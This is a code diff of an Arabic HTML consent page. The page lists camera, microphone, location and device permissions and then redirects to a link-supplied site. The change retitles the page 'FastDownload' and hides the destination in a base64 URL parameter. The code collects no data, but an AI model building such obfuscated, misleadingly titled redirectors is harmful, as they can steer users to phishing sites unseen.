@@ -1,176 +1,139 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
-
 <head>
-
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>صفحة الموافقة</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>FastDownload</title>
 
 <style>
-
-* {
-    box-sizing: border-box;
-}
-
 body {
-    margin: 0;
-    padding: 20px;
-    background: #101827;
-    color: white;
-    font-family: Arial, sans-serif;
+    background:#101827;
+    color:white;
+    font-family:Arial;
+    padding:20px;
 }
-
-.container {
-    max-width: 450px;
-    margin: 50px auto;
-    padding: 25px;
-    background: #1c293b;
-    border-radius: 15px;
+.box {
+    max-width:430px;
+    margin:50px auto;
+    padding:25px;
+    background:#1c293b;
+    border-radius:14px;
 }
-
-h2 {
-    text-align: center;
+.item {
+    background:#263750;
+    padding:14px;
+    margin:12px 0;
+    border-radius:8px;
 }
-
-.description {
-    color: #b8c5d8;
-    line-height: 1.8;
-    font-size: 14px;
+p {
+    line-height:1.8;
+    color:#c4d0df;
 }
-
-.permission {
-    padding: 13px;
-    margin: 12px 0;
-    background: #263750;
-    border-radius: 8px;
-}
-
 button {
-    width: 100%;
-    padding: 14px;
-    margin-top: 15px;
-    border: none;
-    border-radius: 8px;
-    background: #2585ed;
-    color: white;
-    font-size: 16px;
-    cursor: pointer;
+    width:100%;
+    padding:14px;
+    margin-top:15px;
+    border:0;
+    border-radius:8px;
+    background:#2585ed;
+    color:white;
+    font-size:16px;
 }
-
 .reject {
-    background: #43536a;
+    background:#43536a;
 }
-
 </style>
-
 </head>
 
 <body>
 
-<div class="container">
+<div class="box">
+<h2>صفحة الموافقة</h2>
 
-<h2>الموافقة على البيانات</h2>
-
-<p class="description">
-قبل الانتقال إلى الموقع، يرجى مراجعة الخيارات التي حددها منشئ الرابط.
-هذه الصفحة لا تجمع بياناتك ولا تسجل صوتك أو تصورك.
+<p>
+راجع المعلومات التالية قبل المتابعة إلى الموقع.
+هذه الصفحة لا تلتقط الصور أو الصوت ولا تجمع بيانات موقعك.
 </p>
 
-<div id="permissions"></div>
+<div id="details"></div>
 
-<button onclick="continueToWebsite()">
-موافقة والمتابعة إلى الموقع
-</button>
-
-<button class="reject" onclick="rejectRequest()">
-رفض
-</button>
-
+<button onclick="continueSite()">موافقة والمتابعة</button>
+<button class="reject" onclick="reject()">رفض</button>
 </div>
 
 <script>
+function decodePayload() {
+    const params = new URLSearchParams(location.search);
+    const encoded = params.get("u");
 
-const params = new URLSearchParams(window.location.search);
+    if (!encoded) throw new Error("Missing payload");
 
-const site = params.get("site");
+    const normalized = encoded.replace(/ /g, "+");
+    const decoded = decodeURIComponent(
+        Array.from(atob(normalized))
+            .map(c => "%" + c.charCodeAt(0).toString(16).padStart(2,"0"))
+            .join("")
+    );
 
-const selected = (params.get("permissions") || "")
-    .split(",")
-    .filter(Boolean);
+    return new URLSearchParams(decoded);
+}
+
+let data;
+
+try {
+    data = decodePayload();
+} catch {
+    document.querySelector(".box").innerHTML =
+        "<h2>الرابط غير صالح</h2><p>تعذر قراءة إعدادات الرابط.</p>";
+}
 
 const names = {
-    camera: "استخدام الكاميرا",
-    microphone: "استخدام الميكروفون",
-    location: "الوصول إلى الموقع الجغرافي",
+    camera: "الكاميرا",
+    microphone: "الميكروفون",
+    location: "الموقع الجغرافي",
     device: "معلومات الجهاز"
 };
 
-const permissionsBox = document.getElementById("permissions");
+if (data) {
+    const container = document.getElementById("details");
+    const selected = (data.get("permissions") || "")
+        .split(",")
+        .filter(Boolean);
 
-selected.forEach(permission => {
+    selected.forEach(value => {
+        if (!names[value]) return;
 
-    if (!names[permission]) return;
+        const item = document.createElement("div");
+        item.className = "item";
+        item.textContent = names[value];
+        container.appendChild(item);
+    });
+}
 
-    const element = document.createElement("div");
+function continueSite() {
+    if (!data) return;
 
-    element.className = "permission";
-    element.textContent = names[permission];
-
-    permissionsBox.appendChild(element);
-
-});
-
-function validateWebsite() {
+    let destination;
 
     try {
+        destination = new URL(data.get("site"));
 
-        const url = new URL(site);
-
-        if (!["http:", "https:"].includes(url.protocol)) {
-            return null;
+        if (!["https:", "http:"].includes(destination.protocol)) {
+            throw new Error();
         }
-
-        return url.href;
-
     } catch {
-
-        return null;
-
-    }
-
-}
-
-function continueToWebsite() {
-
-    const destination = validateWebsite();
-
-    if (!destination) {
-
         alert("رابط الموقع غير صالح");
         return;
-
     }
 
-    window.location.assign(destination);
-
+    location.replace(destination.href);
 }
 
-function rejectRequest() {
-
-    document.body.innerHTML = `
-        <div class="container">
-            <h2>تم رفض الموافقة</h2>
-            <p class="description">
-                لم يتم جمع أي بيانات.
-            </p>
-        </div>
-    `;
-
+function reject() {
+    document.querySelector(".box").innerHTML =
+        "<h2>تم رفض الموافقة</h2><p>لم يتم جمع أي بيانات.</p>";
 }
-
 </script>
 
 </body>
-  </html>
+</html>
